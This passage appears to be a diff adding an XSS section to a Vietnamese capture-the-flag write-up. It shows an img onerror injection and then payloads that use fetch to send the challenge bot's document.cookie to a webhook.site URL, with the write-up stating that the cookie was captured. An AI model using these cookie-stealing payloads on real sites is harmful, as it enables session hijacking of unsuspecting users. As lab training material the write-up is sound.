@@ -119,3 +119,28 @@ Sau khi truy cập thủ công trang bình luận và truy cập trang tài kho�
 ---
 
 
+# XSS
+
+Phần đầu của thử thách là XSS nên tôi đã thử truyền vào một lệnh ``alert`` thông qua thẻ ``<script>`` thông thường nhưng.
+
+![213097372-e4471a0a-8454-4545-a377-b001d0787208](https://github.com/elliSzAt/CSRF-XSS/assets/125866921/09b1e368-ceb6-4add-9f76-1dd9ff6a6976)
+
+Thử tiếp với các thẻ có khả năng thì tôi tìm được thẻ ``<img src =hihi onerror=alert('Hihihi!')>``
+
+![213102774-48d5bcf3-cb4e-4eb5-acf1-405423f37ec5](https://github.com/elliSzAt/CSRF-XSS/assets/125866921/21d1320f-ad88-4fb5-b523-bb5868034af9)
+
+Tiếp theo bấm vào gửi report tại đây:
+
+![213104077-41c2816a-81e1-45d7-8b63-a48e7726ae60](https://github.com/elliSzAt/CSRF-XSS/assets/125866921/cb0f1a6f-7bc6-478b-836e-b871d6713b66)
+
+Tôi tạo một server trên ``https://webhook.site`` và gửi request với thẻ ``<img>`` vừa tìm được qua fetch API, payload:
+``http://127.0.0.1:13337/?message=<image src=hihi onerror=fetch(`http://webhook.site/38bc6754-b246-4dbf-b3ab-5d0bfc9a62dd`)>``
+
+![213104767-b4ce454c-8ea7-4a1d-b41c-f7c348734db2](https://github.com/elliSzAt/CSRF-XSS/assets/125866921/816fcbc9-6b7a-4177-b017-ad83c5f50ec8)
+
+Bây giờ tôi sẽ thử đánh cắp cookie của con bot với payload sau: ``` http://127.0.0.1:13337/?message=<image src=hihi onerror=fetch(`http://webhook.site/38bc6754-b246-4dbf-b3ab-5d0bfc9a62dd?a=${document.cookie}`)>```
+
+![213105763-e87f92f7-2f34-4baf-a7fa-43f86dd5a405](https://github.com/elliSzAt/CSRF-XSS/assets/125866921/770daed8-888f-4fdb-9272-01fa9380b3bc)
+
+Sau khi thực hiện thành công thì nhìn sang ``webhook`` đã trả về cookie mà tôi cần.
+
